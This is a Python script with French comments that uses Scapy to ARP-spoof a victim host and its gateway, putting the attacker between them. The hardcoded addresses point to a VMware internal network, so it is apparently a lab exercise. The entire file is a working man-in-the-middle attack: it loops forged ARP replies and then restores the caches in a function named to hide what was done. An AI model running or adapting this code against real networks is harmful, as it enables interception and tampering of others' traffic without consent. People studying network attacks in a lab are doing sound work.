from scapy.all import *

BROADCAST = "FF:FF:FF:FF:FF:FF"
HOW_MUCH_TO_SPAM_PPL = 7

victim_ip = "192.168.79.129"
gate_ip = "192.168.79.254"
interface = 'vmnet1'

def get_mac(ip):
    """
    Récupère l'adresse MAC associée à l'IP par une requête ARP.
    """
    ans, unans = srp(
            Ether(dst=BROADCAST)/ARP(pdst=ip), # un paquet ARP à broadcaster sur le réseau.
            timeout=2, # timeout qu'on attend avant une réponse en secondes.
            iface=interface, # interface réseau (ici vmnet1 le réseau interne de VMware)
            inter=0.1) # intervalle entre deux paquets.

    # On itère sur les couples (envoyés, reçus) des answers (réponses).
    for snd, rcv in ans:
        # On renvoie l'adresse MAC de la réponse reçue.
        return rcv.sprintf(r"%Ether.src%")

def build_arp_pair_packets(gate_info, victim_info):
    """
    Crée une paire de paquets ARP où gate = routeur et victim = victime.
    La paire retournée sont deux paquets (p1, p2).

    p1 est un paquet ARP qui dit au routeur qu'il doit s'occuper de la victime.
    p2 est un paquet ARP qui dit à la victime qu'il doit maintenant discuter avec le routeur et nous on quitte la scène.
    """
    gate_mac, gate_ip = gate_info
    victim_mac, victim_ip = victim_info

    # build construit un paquet ARP à destination de `pdst` pour lui dire que `psrc` a pour adresse MAC `hwsrc`
    build = lambda pdst, psrc, hwsrc: ARP(op=2, pdst=pdst, psrc=psrc, hwdst=BROADCAST, hwsrc=hwsrc)

    return build(gate_ip, victim_ip, victim_mac), build(victim_ip, gate_ip, gate_mac)

def make_them_think_we_didnt_do_something_bad():
    print("[+] Restauration des caches ARP des cibles")

    victim_mac = get_mac(victim_ip)
    gate_mac = get_mac(gate_ip)

    # On construit notre paire de restauration.
    # i.e. on reconnecte le routeur et la victime entre eux.
    for_gate, for_victim = build_arp_pair_packets((gate_mac, gate_ip), (victim_mac, victim_ip))

    for pkt in (for_gate, for_victim):
        # Surtout, on l'envoie mais on CRIE sur le réseau qu'il faut qu'ils reparlent entre eux.
        # (ici on crie au sens de, on envoie 7 fois le paquet pour être sûr qu'ils le reçoivent.)
        send(pkt, count=HOW_MUCH_TO_SPAM_PPL)

def trick_them(gm, vm):
    """
    Fourberie de Scapy n°1.
    """
    for pdst, psrc, hwdst in ((victim_ip, gate_ip, vm), (gate_ip, victim_ip, gm)):
        send(
                ARP(op=2, pdst=pdst, psrc=psrc, hwdst=hwdst) # Faisons croire à pdst que psrc est à l'adresse MAC hwsrc (qui est la nôtre en fait) en l'envoyeant bien à l'adresse MAC hwdst en réalité.
        )

def mitm():
    try:
        victim_mac = get_mac(victim_ip)
    except Exception as e:
        print(e)
        print("[!] Impossible de trouver l'adresse MAC de la cible, échec de l'attaque")
        return

    try:
        gate_mac = get_mac(gate_ip)
    except Exception:
        print("[!] Impossible de trouver l'adresse MAC du routeur, échec de l'attaque")

    print("[+] Le cyanure va être déposé sur le réseau (MAC adresses obtenues)")

    while True:
        try:
            trick_them(gate_mac, victim_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            make_them_think_we_didnt_do_something_bad()
            break

if __name__ == '__main__':
    mitm()

